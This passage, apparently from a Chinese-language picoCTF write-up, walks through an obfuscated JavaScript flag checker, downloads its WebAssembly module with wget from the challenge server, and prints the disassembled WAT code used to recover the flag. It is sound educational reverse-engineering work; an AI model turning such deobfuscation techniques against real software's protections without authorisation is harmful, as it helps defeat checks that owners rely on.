class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">_0x4e0e</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> whensCollection</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/** @type &#123;number&#125; */</span>  url <span class="token operator">=</span> url <span class="token operator">-</span> <span class="token number">470</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> _0x402c6f <span class="token operator">=</span> _0x402c<span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> _0x402c6f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> oldPassword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> toMonths <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> userPsd <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">491</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">493</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">475</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">473</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">482</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">483</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">478</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">480</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">472</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">490</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">485</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>userPsd <span class="token operator">===</span> oldPassword<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        data<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>_0x41d31a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      data<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_0x402c<span class="token punctuation">,</span> <span class="token number">627907</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> exports<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> findMiddlePosition <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>  <span class="token keyword">let</span> leftBranch <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">489</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> rightBranch <span class="token operator">=</span> <span class="token keyword">await</span> WebAssembly<span class="token punctuation">[</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">479</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">await</span> leftBranch<span class="token punctuation">[</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">474</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> module <span class="token operator">=</span> rightBranch<span class="token punctuation">[</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">470</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  exports <span class="token operator">=</span> module<span class="token punctuation">[</span><span class="token string">"exports"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** * @return &#123;undefined&#125; */</span><span class="token keyword">function</span> <span class="token function">onButtonPress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> navigatePop <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>  <span class="token keyword">let</span> params <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">484</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">477</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> params<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    exports<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">471</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">492</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  exports<span class="token punctuation">[</span><span class="token string">"copy_char"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> params<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>exports<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">487</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">494</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">476</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">481</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">486</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">494</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">476</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">481</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">488</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>这个地方要涉及到一个知识点：<code>webassembly</code>，随着Web技术越来越成熟，人们已经不满足浏览器只可以支持简单的网页了，3D游戏一直是开发者们坚持的目标，想让3D游戏可以在浏览器中运行起来。比如这个win2000的机器就可以在浏览器中打开：<a href="https://bellard.org/jslinux/vm.html?url=https://bellard.org/jslinux/win2k.cfg&mem=192&graphic=1&w=1024&h=768">https://bellard.org/jslinux/vm.html?url=https://bellard.org/jslinux/win2k.cfg&amp;mem=192&amp;graphic=1&amp;w=1024&amp;h=768</a><br><code>WebAssembly</code>也是一中将<code>C/C++</code>语言编译成JS代码，不过编译过后<code>WebAssembly</code>成了二进制字节码<br>下载下来</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://mercury.picoctf.net:36152/JIFxzHyW8W -q -O script.wasm<span class="token function">file</span> script.wasm./wasm2wat script.wasm <span class="token operator">></span> script.wat</code></pre><p>得到文件</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">(</span><span class="token function">module</span>  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span>    <span class="token punctuation">(</span>local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32<span class="token punctuation">)</span>    global<span class="token punctuation">.</span>get <span class="token number">0</span>    local<span class="token punctuation">.</span>set <span class="token number">2</span>    i32<span class="token punctuation">.</span>const <span class="token number">32</span>    local<span class="token punctuation">.</span>set <span class="token number">3</span>    local<span class="token punctuation">.</span>get <span class="token number">2</span>    local<span class="token punctuation">.</span>get <span class="token number">3</span>    i32<span class="token punctuation">.</span>sub    local<span class="token punctuation">.</span>set <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">0</span>    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">24</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">1</span>    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">20</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">24</span>    local<span class="token punctuation">.</span>set <span class="token number">5</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">5</span>    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">16</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">20</span>    local<span class="token punctuation">.</span>set <span class="token number">6</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">6</span>    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">12</span>    block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>      loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">16</span>        local<span class="token punctuation">.</span>set <span class="token number">7</span>        i32<span class="token punctuation">.</span>const <span class="token number">1</span>        local<span class="token punctuation">.</span>set <span class="token number">8</span>        local<span class="token punctuation">.</span>get <span class="token number">7</span>        local<span class="token punctuation">.</span>get <span class="token number">8</span>        i32<span class="token punctuation">.</span>add        local<span class="token punctuation">.</span>set <span class="token number">9</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        local<span class="token punctuation">.</span>get <span class="token number">9</span>        i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">16</span>        local<span class="token punctuation">.</span>get <span class="token number">7</span>        i32<span class="token punctuation">.</span>load8_u        local<span class="token punctuation">.</span>set <span class="token number">10</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        local<span class="token punctuation">.</span>get <span class="token number">10</span>        i32<span class="token punctuation">.</span>store8 offset<span class="token operator">=</span><span class="token number">11</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">12</span>        local<span class="token punctuation">.</span>set <span class="token number">11</span>        i32<span class="token punctuation">.</span>const <span class="token number">1</span>        local<span class="token punctuation">.</span>set <span class="token number">12</span>        local<span class="token punctuation">.</span>get <span class="token number">11</span>        local<span class="token punctuation">.</span>get <span class="token number">12</span>        i32<span class="token punctuation">.</span>add        local<span class="token punctuation">.</span>set <span class="token number">13</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        local<span class="token punctuation">.</span>get <span class="token number">13</span>        i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">12</span>        local<span class="token punctuation">.</span>get <span class="token number">11</span>        i32<span class="token punctuation">.</span>load8_u        local<span class="token punctuation">.</span>set <span class="token number">14</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        local<span class="token punctuation">.</span>get <span class="token number">14</span>        i32<span class="token punctuation">.</span>store8 offset<span class="token operator">=</span><span class="token number">10</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>        local<span class="token punctuation">.</span>set <span class="token number">15</span>        i32<span class="token punctuation">.</span>const <span class="token number">255</span>        local<span class="token punctuation">.</span>set <span class="token number">16</span>        local<span class="token punctuation">.</span>get <span class="token number">15</span>        local<span class="token punctuation">.</span>get <span class="token number">16</span>        i32<span class="token punctuation">.</span>and        local<span class="token punctuation">.</span>set <span class="token number">17</span>        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">3</span>          local<span class="token punctuation">.</span>get <span class="token number">17</span>          br_if <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span>          local<span class="token punctuation">.</span>get <span class="token number">4</span>          i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>          local<span class="token punctuation">.</span>set <span class="token number">18</span>          i32<span class="token punctuation">.</span>const <span class="token number">255</span>          local<span class="token punctuation">.</span>set <span class="token number">19</span>          local<span class="token punctuation">.</span>get <span class="token number">18</span>          local<span class="token punctuation">.</span>get <span class="token number">19</span>          i32<span class="token punctuation">.</span>and          local<span class="token punctuation">.</span>set <span class="token number">20</span>          local<span class="token punctuation">.</span>get <span class="token number">4</span>          i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">10</span>          local<span class="token punctuation">.</span>set <span class="token number">21</span>          i32<span class="token punctuation">.</span>const <span class="token number">255</span>          local<span class="token punctuation">.</span>set <span class="token number">22</span>          local<span class="token punctuation">.</span>get <span class="token number">21</span>          local<span class="token punctuation">.</span>get <span class="token number">22</span>          i32<span class="token punctuation">.</span>and          local<span class="token punctuation">.</span>set <span class="token number">23</span>          local<span class="token punctuation">.</span>get <span class="token number">20</span>          local<span class="token punctuation">.</span>get <span class="token number">23</span>          i32<span class="token punctuation">.</span>sub          local<span class="token punctuation">.</span>set <span class="token number">24</span>          local<span class="token punctuation">.</span>get <span class="token number">4</span>          local<span class="token punctuation">.</span>get <span class="token number">24</span>          i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">28</span>          br <span class="token number">2</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>        end        local<span class="token punctuation">.</span>get <span class="token number">4</span>        i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>        local<span class="token punctuation">.</span>set <span class="token number">25</span>        i32<span class="token punctuation">.</span>const <span class="token number">255</span>        local<span class="token punctuation">.</span>set <span class="token number">26</span>        local<span class="token punctuation">.</span>get <span class="token number">25</span>        local<span class="token punctuation">.</span>get <span class="token number">26</span>        i32<span class="token punctuation">.</span>and        local<span class="token punctuation">.</span>set <span class="token number">27</span>        local<span class="token punctuation">.</span>get <span class="token number">4</span>        i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">10</span>        local<span class="token punctuation">.</span>set <span class="token number">28</span>        i32<span class="token punctuation">.</span>const <span class="token number">255</span>        local<span class="token punctuation">.</span>set <span class="token number">29</span>        local<span class="token punctuation">.</span>get <span class="token number">28</span>        local<span class="token punctuation">.</span>get <span class="token number">29</span>        i32<span class="token punctuation">.</span>and        local<span class="token punctuation">.</span>set <span class="token number">30</span>        local<span class="token punctuation">.</span>get <span class="token number">27</span>        local<span class="token punctuation">.</span>set <span class="token number">31</span>        local<span class="token punctuation">.</span>get <span class="token number">30</span>        local<span class="token punctuation">.</span>set <span class="token number">32</span>        local<span class="token punctuation">.</span>get <span class="token number">31</span>        local<span class="token punctuation">.</span>get <span class="token number">32</span>        i32<span class="token punctuation">.</span>eq        local<span class="token punctuation">.</span>set <span class="token number">33</span>        i32<span class="token punctuation">.</span>const <span class="token number">1</span>        local<span class="token punctuation">.</span>set <span class="token number">34</span>        local<span class="token punctuation">.</span>get <span class="token number">33</span>        local<span class="token punctuation">.</span>get <span class="token number">34</span>        i32<span class="token punctuation">.</span>and        local<span class="token punctuation">.</span>set <span class="token number">35</span>        local<span class="token punctuation">.</span>get <span class="token number">35</span>        br_if <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>      end      local<span class="token punctuation">.</span>get <span class="token number">4</span>      i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>      local<span class="token punctuation">.</span>set <span class="token number">36</span>      i32<span class="token punctuation">.</span>const <span class="token number">255</span>      local<span class="token punctuation">.</span>set <span class="token number">37</span>      local<span class="token punctuation">.</span>get <span class="token number">36</span>      local<span class="token punctuation">.</span>get <span class="token number">37</span>      i32<span class="token punctuation">.</span>and      local<span class="token punctuation">.</span>set <span class="token number">38</span>      local<span class="token punctuation">.</span>get <span class="token number">4</span>      i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">10</span>      local<span class="token punctuation">.</span>set <span class="token number">39</span>      i32<span class="token punctuation">.</span>const <span class="token number">255</span>      local<span class="token punctuation">.</span>set <span class="token number">40</span>      local<span class="token punctuation">.</span>get <span class="token number">39</span>      local<span class="token punctuation">.</span>get <span class="token number">40</span>      i32<span class="token punctuation">.</span>and      local<span class="token punctuation">.</span>set <span class="token number">41</span>      local<span class="token punctuation">.</span>get <span class="token number">38</span>      local<span class="token punctuation">.</span>get <span class="token number">41</span>      i32<span class="token punctuation">.</span>sub      local<span class="token punctuation">.</span>set <span class="token number">42</span>      local<span class="token punctuation">.</span>get <span class="token number">4</span>      local<span class="token punctuation">.</span>get <span class="token number">42</span>      i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">28</span>    end    local<span class="token punctuation">.</span>get <span class="token number">4</span>    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">28</span>    local<span class="token punctuation">.</span>set <span class="token number">43</span>    local<span class="token punctuation">.</span>get <span class="token number">43</span>    <span class="token keyword">return</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span>    <span class="token punctuation">(</span>local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32<span class="token punctuation">)</span>    i32<span class="token punctuation">.</span>const <span class="token number">0</span>    local<span class="token punctuation">.</span>set <span class="token number">0</span>    i32<span class="token punctuation">.</span>const <span class="token number">1072</span>    local<span class="token punctuation">.</span>set <span class="token number">1</span>    i32<span class="token punctuation">.</span>const <span class="token number">1024</span>    local<span class="token punctuation">.</span>set <span class="token number">2</span>    local<span class="token punctuation">.</span>get <span class="token number">2</span>    local<span class="token punctuation">.</span>get <span class="token number">1</span>    call <span class="token number">1</span>    local<span class="token punctuation">.</span>set <span class="token number">3</span>    local<span class="token punctuation">.</span>get <span class="token number">3</span>    local<span class="token punctuation">.</span>set <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">0</span>    local<span class="token punctuation">.</span>set <span class="token number">5</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">5</span>    i32<span class="token punctuation">.</span>ne    local<span class="token punctuation">.</span>set <span class="token number">6</span>    i32<span class="token punctuation">.</span>const <span class="token operator">-</span><span class="token number">1</span>    local<span class="token punctuation">.</span>set <span class="token number">7</span>    local<span class="token punctuation">.</span>get <span class="token number">6</span>    local<span class="token punctuation">.</span>get <span class="token number">7</span>    i32<span class="token punctuation">.</span>xor    local<span class="token punctuation">.</span>set <span class="token number">8</span>    i32<span class="token punctuation">.</span>const <span class="token number">1</span>    local<span class="token punctuation">.</span>set <span class="token number">9</span>    local<span class="token punctuation">.</span>get <span class="token number">8</span>    local<span class="token punctuation">.</span>get <span class="token number">9</span>    i32<span class="token punctuation">.</span>and    local<span class="token punctuation">.</span>set <span class="token number">10</span>    local<span class="token punctuation">.</span>get <span class="token number">10</span>    <span class="token keyword">return</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span>    <span class="token punctuation">(</span>local i32 i32 i32 i32 i32<span class="token punctuation">)</span>    global<span class="token punctuation">.</span>get <span class="token number">0</span>    local<span class="token punctuation">.</span>set <span class="token number">2</span>    i32<span class="token punctuation">.</span>const <span class="token number">16</span>    local<span class="token punctuation">.</span>set <span class="token number">3</span>    local<span class="token punctuation">.</span>get <span class="token number">2</span>    local<span class="token punctuation">.</span>get <span class="token number">3</span>    i32<span class="token punctuation">.</span>sub    local<span class="token punctuation">.</span>set <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">0</span>    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">12</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    local<span class="token punctuation">.</span>get <span class="token number">1</span>    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">8</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">12</span>    local<span class="token punctuation">.</span>set <span class="token number">5</span>    local<span class="token punctuation">.</span>get <span class="token number">4</span>    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">8</span>    local<span class="token punctuation">.</span>set <span class="token number">6</span>    local<span class="token punctuation">.</span>get <span class="token number">6</span>    local<span class="token punctuation">.</span>get <span class="token number">5</span>    i32<span class="token punctuation">.</span>store8 offset<span class="token operator">=</span><span class="token number">1072</span>    <span class="token keyword">return</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">table</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token number">1</span> <span class="token number">1</span> funcref<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">memory</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>mut i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">66864</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1072</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">global</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token function">i32</span> 